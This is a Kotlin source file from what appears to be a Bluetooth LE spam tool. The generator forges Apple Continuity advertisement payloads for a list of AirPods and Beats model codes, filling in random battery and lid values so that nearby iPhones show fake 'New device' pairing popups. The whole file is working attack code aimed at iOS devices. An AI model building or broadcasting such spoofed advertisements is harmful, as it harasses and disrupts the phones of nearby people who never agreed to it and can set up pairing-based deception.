package com.nlespam.generators

import com.nlespam.helpers.HexUtils
import com.nlespam.helpers.HexUtils.toHexString
import com.nlespam.models.*
import kotlin.random.Random

class AppleDevicePopupGenerator : SpamGenerator {
    override val name = "Apple Device Popup"

    val deviceData = mapOf(
        // NEW 2024-2025 Apple devices
        "1520" to "AirPods 4",
        "1820" to "AirPods 4 ANC",
        "1920" to "AirPods Pro 2 USB-C",
        "1A20" to "AirPods Max 2",
        "1B20" to "Beats Solo Buds",
        "1C20" to "Beats Solo 4",
        "1D20" to "Beats Pill (2024)",
        // Original Apple devices
        "0E20" to "AirPods Pro",
        "0A20" to "AirPods Max",
        "0220" to "AirPods",
        "0F20" to "AirPods 2nd Gen",
        "1320" to "AirPods 3rd Gen",
        "1420" to "AirPods Pro 2nd Gen",
        "1020" to "Beats Flex",
        "0620" to "Beats Solo 3",
        "0320" to "Powerbeats 3",
        "0B20" to "Powerbeats Pro",
        "0C20" to "Beats Solo Pro",
        "1120" to "Beats Studio Buds",
        "0520" to "Beats X",
        "0920" to "Beats Studio 3",
        "1720" to "Beats Studio Pro",
        "1220" to "Beats Fit Pro",
        "1620" to "Beats Studio Buds+",
    )

    private fun randomBatteryLevel(): String {
        val level = ((0..9).random() shl 4) + (0..9).random()
        return HexUtils.intToHex(level)
    }

    private fun randomCaseBattery(): String {
        val level = ((Random.nextInt(8) % 8) shl 4) + (Random.nextInt(10) % 10)
        return HexUtils.intToHex(level)
    }

    private fun randomLidCounter(): String = HexUtils.intToHex(Random.nextInt(256))

    override fun generate(): List<AdvertisementSet> = deviceData.map { (deviceHex, deviceName) ->
        val continuityType = "07"
        val payloadSize = "19"
        val prefix = "07"
        val status = "55"
        val color = "00"

        var payload = continuityType + payloadSize + prefix + deviceHex + status +
                randomBatteryLevel() + randomCaseBattery() + randomLidCounter() +
                color + "00"
        payload += Random.nextBytes(16).toHexString()

        AdvertisementSet(
            title = "New $deviceName",
            target = AdvertisementTarget.IOS,
            type = SpamType.APPLE_DEVICE_POPUP,
            manufacturerData = ManufacturerData(ManufacturerIds.APPLE, HexUtils.decodeHex(payload)),
        )
    }
}
